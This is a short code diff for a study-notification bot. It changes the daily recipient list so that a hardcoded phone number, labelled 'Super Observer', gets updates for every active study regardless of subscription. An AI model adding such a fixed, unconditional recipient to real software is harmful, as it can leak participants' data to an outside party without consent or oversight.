@@ -1552,7 +1552,14 @@ def get_daily_active_phones_for_study(db, study_code):
         models.BotStudySubscription.subscribed_at >= start_of_day
     ).distinct().all()
     
-    return [p[0] for p in subscribers if p[0]]
+    phones = [p[0] for p in subscribers if p[0]]
+    
+    # Super Observer: This number receives all updates for all active studies
+    admin_observer = "573234968972"
+    if admin_observer not in phones:
+        phones.append(admin_observer)
+        
+    return phones
 
 def build_study_report(db, study_code):
     from sqlalchemy import func
